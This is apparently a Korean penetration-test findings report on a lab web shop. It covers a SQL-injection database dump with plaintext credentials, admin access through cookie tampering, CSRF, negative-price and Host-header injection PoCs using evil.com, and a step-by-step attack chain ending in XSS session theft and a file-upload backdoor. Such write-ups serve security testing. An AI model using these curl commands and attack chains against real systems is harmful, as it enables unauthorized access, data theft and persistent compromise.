# 심화 발견 사항 (Advanced Findings)

## 1. SQL Injection - 전체 데이터베이스 덤프

### 데이터베이스 구조 (SQLite)

#### users 테이블
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,          -- 평문 저장!
    profile_image TEXT
)
```

#### orders 테이블
```sql
CREATE TABLE orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    product_name TEXT,
    price INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```

#### products 테이블
```sql
CREATE TABLE products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    image TEXT,
    description TEXT
)
```

#### posts 테이블
```sql
CREATE TABLE posts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    content TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```

### 추출된 데이터

**사용자 계정 (60+개)**:
- admin:admin123 (관리자)
- guest:guest123
- testuser:testpassword
- 기타 랜덤 생성된 계정들...

**주문 데이터**:
- Order 1: user_id=1, Cyber Hoodie, $120
- Order 2: user_id=2, Acid Wash Tee, $45

---

## 2. 인증/인가 취약점 심화

### 가짜 사용자로 관리자 접근
```bash
# 존재하지 않는 사용자(user_id=999)로도 관리자 기능 접근 가능
curl -H "Cookie: user=fake; isAdmin=true; user_id=999" \
  "http://10.210.136.53:3000/admin/users"
```

**결과**: 관리자 페이지 정상 접근 (169개 행 반환)

**의미**:
- 서버에서 사용자 존재 여부를 검증하지 않음
- `isAdmin` 쿠키 값만으로 권한 결정
- 세션/토큰 기반 인증 완전 부재

---

## 3. JSON 파싱 취약점

### Prototype Pollution 시도
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}' \
  "http://10.210.136.53:3000/login"
```
**결과**: 500 Internal Server Error

### JSON Content-Type 로그인
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  "http://10.210.136.53:3000/login"
```
**결과**: 500 Internal Server Error

**분석**: JSON 입력 처리에 문제가 있음. 서버가 `application/x-www-form-urlencoded`만 처리하도록 설계됨.

---

## 4. CSRF 취약점 상세

### 취약한 모든 엔드포인트

| 엔드포인트 | 메서드 | 영향 |
|------------|--------|------|
| /admin/users/{id}/delete | POST | 사용자 삭제 |
| /admin/products/{id} | POST | 상품 정보 수정 |
| /board | POST | 악성 게시글 작성 |
| /profile/upload | POST | 악성 파일 업로드 |
| /signup | POST | 계정 생성 |

### CSRF 공격 시나리오
1. 관리자가 악성 페이지 방문
2. 숨겨진 폼이 자동 제출
3. 사용자 삭제 또는 상품 가격 조작

---

## 5. 비즈니스 로직 취약점

### 음수 가격 설정
```bash
curl -X POST \
  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  -d "name=test&price=-100&description=negative" \
  "http://10.210.136.53:3000/admin/products/1"
```

**결과**: -$100 가격이 저장됨

**잠재적 공격**:
- 음수 가격으로 결제 시 환불 발생 가능
- 총 금액 계산 조작

---

## 6. Host Header Injection 상세

### PoC
```bash
curl -H "Host: evil.com" "http://10.210.136.53:3000/"
```

### 영향받는 태그
```html
<meta property="og:image" content="http://evil.com/images/oversized-hoodie.jpg">
<meta property="og:url" content="http://evil.com">
```

### 공격 시나리오
1. **피싱**: 소셜 미디어 공유 시 악성 URL 표시
2. **캐시 포이즈닝**: CDN 캐시에 악성 콘텐츠 삽입
3. **패스워드 리셋 하이재킹**: 리셋 링크가 공격자 도메인으로 전송

---

## 7. 정보 유출 요약

| 정보 유형 | 추출 방법 | 데이터 |
|-----------|-----------|--------|
| DB 스키마 | SQLi | 4개 테이블 구조 |
| 사용자 목록 | Admin Panel / SQLi | 60+ 계정 |
| 평문 비밀번호 | SQLi | 모든 사용자 |
| 주문 정보 | IDOR / SQLi | 전체 주문 내역 |
| 게시물 | SQLi | 154+ 게시물 |

---

## 8. 공격 체인 최적화

### 최소 단계 완전 장악
```
1. SQL Injection으로 admin:admin123 추출
2. 실제 관리자 로그인 (isAdmin=true 자동 설정)
3. 전체 사용자/주문 정보 접근
4. Stored XSS로 세션 탈취 인프라 구축
5. 파일 업로드로 지속적 백도어 설치
```

### 대안 경로 (크레덴셜 없이)
```
1. 쿠키 조작: isAdmin=true 설정
2. 관리자 패널 직접 접근
3. SQL Injection으로 DB 덤프
4. 추가 공격 수행
```
